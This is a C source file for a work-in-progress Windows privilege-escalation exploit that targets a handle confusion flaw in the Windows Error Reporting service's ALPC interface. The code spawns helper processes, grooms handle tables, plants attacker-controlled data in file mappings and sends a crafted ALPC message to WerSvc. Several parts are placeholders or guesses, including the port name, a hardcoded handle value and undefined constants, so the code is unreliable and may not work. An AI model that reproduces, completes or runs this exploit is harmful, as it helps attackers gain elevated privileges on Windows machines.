// wer_exploit.c — WER ALPC Handle Confusion LPE
// Compile: cl /Fe:wer_exploit.exe wer_exploit.c /link ntdll.lib

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "ntdll.lib")

// ALPC message total size (from FUN_180015384 validation)
#define WER_MSG_TOTAL_SIZE  0x578
#define WER_MSG_BODY_SIZE   (WER_MSG_TOTAL_SIZE - 0x28)  // 0x550

#pragma pack(push, 8)
typedef struct _WER_ALPC_MSG {
    // PORT_MESSAGE header (0x28 bytes on x64)
    USHORT  DataLength;
    USHORT  TotalLength;
    DWORD   ClientPid;
    DWORD   ClientTid;
    DWORD   MessageId;
    BYTE    _header_pad[12];  // union ClientView/ServerView

    // Body (0x550 bytes)
    DWORD   Method;           // +0x28 — must be 0x20000000
    DWORD   Flags;            // +0x2C
    DWORD   PidPrimary;       // +0x30
    DWORD   _pad1;            // +0x34
    DWORD   Tid;              // +0x38
    BYTE    _pad2[0x24];       // +0x3C
    DWORD   PidSecondary;     // +0x60
    DWORD   HandleValue;      // +0x64 — H_map_A (numeric)
    QWORD   HandleArray[5];   // +0x68
    DWORD   StatusOut;        // +0x90
    DWORD   ResultOut;        // +0x94
    BYTE    SharedData[0x4B8]; // +0x98 — first 0xF8 used by FUN_180015600
} WER_ALPC_MSG;
#pragma pack(pop)

// Shared memory header (first 0xF8 bytes of SharedData/section)
#pragma pack(push, 1)
typedef struct _WER_SHARED_HDR {
    DWORD Size;               // +0x00 = 0xF8
    DWORD TargetPid;          // +0x04 = pidB (checked by FUN_1800149d4)
    DWORD Flags;              // +0x08
    BYTE   Data[0xEC];        // +0x0C
} WER_SHARED_HDR;
#pragma pack(pop)

// NtAlpc helpers
typedef NTSTATUS (NTAPI *pNtAlpcConnectPort)(
    PHANDLE, PUNICODE_STRING, PVOID, PVOID, PVOID, PVOID, PVOID, PULONG, PVOID, PVOID);

typedef NTSTATUS (NTAPI *pNtAlpcSendWaitReceivePort)(
    HANDLE, ULONG, PVOID, PVOID, PVOID, PULONG, PVOID, PULONG);

static pNtAlpcConnectPort    NtAlpcConnectPort;
static pNtAlpcSendWaitReceivePort NtAlpcSendWaitReceivePort;

static HANDLE g_procA, g_procB;
static DWORD  g_pidA, g_pidB;
static HANDLE g_mapA;
static DWORD  g_hMapA_value;
static HANDLE g_sharedMemA;  // IPC between exploit and child procs

// ---- Process A: creates file mapping, writes shared header ----
int procA_entry(void) {
    // Create file mapping that WerSvc will duplicate from us
    g_mapA = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL,
                                PAGE_READWRITE, 0, 0xF8, NULL);
    if (!g_mapA) {
        printf("[A] CreateFileMapping failed: %d\n", GetLastError());
        return 1;
    }
    g_hMapA_value = (DWORD)(ULONG_PTR)g_mapA;
    printf("[A] File mapping handle: 0x%x\n", g_hMapA_value);

    // Write shared header
    PWER_SHARED_HDR view = (PWER_SHARED_HDR)MapViewOfFile(
        g_mapA, FILE_MAP_WRITE, 0, 0, 0);
    if (!view) return 2;

    memset(view, 0, 0xF8);
    view->Size = 0xF8;
    view->TargetPid = g_pidB;  // MUST match pidB for FUN_1800149d4
    UnmapViewOfFile(view);

    // Signal exploit that we're ready
    HANDLE hReady = OpenEventW(EVENT_MODIFY_STATE, FALSE,
                               L"Global\\WER_Exploit_Ready_A");
    if (hReady) { SetEvent(hReady); CloseHandle(hReady); }

    // Keep alive — WerSvc needs to OpenProcess us
    Sleep(INFINITE);
    return 0;
}

// ---- Process B: handle table grooming ----
int procB_entry(void) {
    // Wait for A to create mapping and report handle value
    HANDLE hReady = OpenEventW(EVENT_MODIFY_STATE, FALSE,
                               L"Global\\WER_Exploit_Ready_A");
    if (hReady) { WaitForSingleObject(hReady, 5000); CloseHandle(hReady); }

    // Read target handle value from shared IPC
    // (In production, use a named section or pipe)
    // For now, assume we know g_hMapA_value via side channel

    DWORD target_handle = g_hMapA_value;  // Would be communicated via IPC

    printf("[B] Target handle index: 0x%x\n", target_handle);

    // Phase 1: Fill handle table with cheap events up to target index
    HANDLE events[1024];
    int count = 0;
    DWORD last_handle = 0;

    while (count < 1024) {
        HANDLE h = CreateEventW(NULL, FALSE, FALSE, NULL);
        if (!h) break;
        DWORD hv = (DWORD)(ULONG_PTR)h;
        events[count++] = h;

        if (hv >= target_handle) {
            // We've reached or passed the target index
            if (hv == target_handle) {
                // Free this slot — we'll place our payload here
                CloseHandle(h);
                events[--count] = NULL;
                break;
            }
            // Overshot — close and retry
            CloseHandle(h);
            count--;
            break;
        }
    }

    // Phase 2: Place payload handle at target index
    // Option A: Handle to ourselves with PROCESS_ALL_ACCESS
    // When WerSvc dups this (thinking it's a file mapping), it gets
    // a process handle to us. MapViewOfFile fails, but DuplicateHandle
    // already gave WerSvc a process handle. Then FUN_180026608 may
    // push it into WerFault via inherit list.

    // Option B: Another file mapping with attacker-controlled content
    // WerSvc maps it, reads our data, passes to WerFault.
    // This is cleaner — MapViewOfFile succeeds, FUN_180015600 copies
    // our data, and the "validated" structure contains whatever we want.

    HANDLE hPayload = CreateFileMappingW(
        INVALID_HANDLE_VALUE, NULL,
        PAGE_READWRITE, 0, 0xF8, NULL);

    DWORD payload_handle = (DWORD)(ULONG_PTR)hPayload;
    printf("[B] Payload handle: 0x%x (target: 0x%x)\n",
           payload_handle, target_handle);

    if (payload_handle != target_handle) {
        printf("[B] Handle mismatch! Need grooming adjustment.\n");
        // In production: close handles between payload and target,
        // then re-allocate to hit exact index
    }

    // Write payload data into the mapping
    PWER_SHARED_HDR payload = (PWER_SHARED_HDR)MapViewOfFile(
        hPayload, FILE_MAP_WRITE, 0, 0, 0);
    if (payload) {
        memset(payload, 0, 0xF8);
        payload->Size = 0xF8;
        payload->TargetPid = g_pidB;  // Passes validation in FUN_1800149d4
        // Remaining 0xEC bytes = attacker-controlled data
        // that gets copied into WerSvc's local buffer via FUN_180015600
        // and eventually into WerFault's shared section
        UnmapViewOfFile(payload);
    }

    // Signal ready
    HANDLE hReadyB = OpenEventW(EVENT_MODIFY_STATE, FALSE,
                                L"Global\\WER_Exploit_Ready_B");
    if (hReadyB) { SetEvent(hReadyB); CloseHandle(hReadyB); }

    Sleep(INFINITE);
    return 0;
}

// ---- Main exploit logic ----
int main(int argc, char *argv[]) {
    // Resolve NtAlpc functions
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    NtAlpcConnectPort = (pNtAlpcConnectPort)
        GetProcAddress(ntdll, "NtAlpcConnectPort");
    NtAlpcSendWaitReceivePort = (pNtAlpcSendWaitReceivePort)
        GetProcAddress(ntdll, "NtAlpcSendWaitReceivePort");

    if (!NtAlpcConnectPort || !NtAlpcSendWaitReceivePort) {
        printf("[-] Failed to resolve NtAlpc functions\n");
        return 1;
    }

    // Child process dispatch
    if (argc > 1) {
        if (!strcmp(argv[1], "--procA")) return procA_entry();
        if (!strcmp(argv[1], "--procB")) return procB_entry();
    }

    printf("=== WER ALPC Handle Confusion Exploit ===\n\n");

    // Create synchronization events
    CreateEventW(NULL, TRUE, FALSE, L"Global\\WER_Exploit_Ready_A");
    CreateEventW(NULL, TRUE, FALSE, L"Global\\WER_Exploit_Ready_B");

    // Get our own path for child spawning
    WCHAR selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);

    // Spawn process A
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    WCHAR cmdA[MAX_PATH + 32];
    wsprintfW(cmdA, L"\"%s\" --procA", selfPath);

    if (!CreateProcessW(NULL, cmdA, NULL, NULL, FALSE,
                        0, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to spawn A: %d\n", GetLastError());
        return 1;
    }
    g_procA = pi.hProcess;
    g_pidA = pi.dwProcessId;
    printf("[+] Process A: PID %d\n", g_pidA);

    // Spawn process B (same binary — satisfies CompareStringOrdinal)
    WCHAR cmdB[MAX_PATH + 32];
    wsprintfW(cmdB, L"\"%s\" --procB", selfPath);

    if (!CreateProcessW(NULL, cmdB, NULL, NULL, FALSE,
                        0, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to spawn B: %d\n", GetLastError());
        return 1;
    }
    g_procB = pi.hProcess;
    g_pidB = pi.dwProcessId;
    printf("[+] Process B: PID %d\n", g_pidB);

    // Wait for both to be ready
    HANDLE hReadyA = OpenEventW(SYNCHRONIZE, FALSE,
                                L"Global\\WER_Exploit_Ready_A");
    HANDLE hReadyB = OpenEventW(SYNCHRONIZE, FALSE,
                                L"Global\\WER_Exploit_Ready_B");
    WaitForSingleObject(hReadyA, 5000);
    WaitForSingleObject(hReadyB, 5000);

    // TODO: Retrieve g_hMapA_value from process A via IPC
    // For now, assume handle value is predictable
    // Typical first CreateFileMapping handle in a fresh process: 0x2C0-0x300
    g_hMapA_value = 0x2C0;  // PLACEHOLDER — needs IPC

    printf("[+] Handle value to confuse: 0x%x\n", g_hMapA_value);
    printf("[+] PidPrimary=%d PidSecondary=%d\n", g_pidA, g_pidB);

    // Connect to WER ALPC port
    UNICODE_STRING portName;
    // PORT NAME NEEDED — must find via reverse engineering
    // Candidates: \RPC Control\WindowsErrorReportingService
    //             \RPC Control\WER_Something
    //             \BaseNamedObjects\WerSvc...
    // Need to check service init for NtCreateAlpcPort call
    RtlInitUnicodeString(&portName, L"\\RPC Control\\WindowsErrorReportingService");

    HANDLE hPort = NULL;
    SECURITY_QUALITY_OF_SERVICE sqos = {
        sizeof(sqos), SecurityAnonymous, FALSE, FALSE
    };

    SIZE_T msgSize = WER_MSG_TOTAL_SIZE;
    NTSTATUS status = NtAlpcConnectPort(
        &hPort, &portName, &sqos, NULL,
        NULL, NULL, NULL, NULL,
        NULL, NULL);

    if (status < 0) {
        printf("[-] NtAlpcConnectPort failed: 0x%08x\n", status);
        printf("    (Port name may be wrong — need to verify)\n");
        goto cleanup;
    }
    printf("[+] Connected to WER ALPC port\n");

    // Build malicious message
    WER_ALPC_MSG msg;
    memset(&msg, 0, sizeof(msg));

    msg.DataLength = WER_MSG_BODY_SIZE;
    msg.TotalLength = WER_MSG_TOTAL_SIZE;
    msg.Method = 0x20000000;
    msg.PidPrimary = g_pidA;
    msg.PidSecondary = g_pidB;
    msg.HandleValue = g_hMapA_value;
    msg.HandleArray[0] = g_hMapA_value;

    // Send message
    status = NtAlpcSendWaitReceivePort(
        hPort, ALPC_MSGFLG_SYNC_MESSAGE,
        (PVOID)&msg, NULL,
        NULL, NULL, NULL, NULL);

    if (status < 0) {
        printf("[-] Send failed: 0x%08x\n", status);
    } else {
        printf("[+] Message sent! StatusOut=0x%x ResultOut=0x%x\n",
               msg.StatusOut, msg.ResultOut);
        printf("[+] Check process B for inherited handles\n");
    }

    CloseHandle(hPort);

cleanup:
    if (hReadyA) CloseHandle(hReadyA);
    if (hReadyB) CloseHandle(hReadyB);

    // Keep children alive for inspection
    printf("\n[*] Children running. Press Enter to cleanup.\n");
    getchar();

    TerminateProcess(g_procA, 0);
    TerminateProcess(g_procB, 0);
    CloseHandle(g_procA);
    CloseHandle(g_procB);

    return 0;
}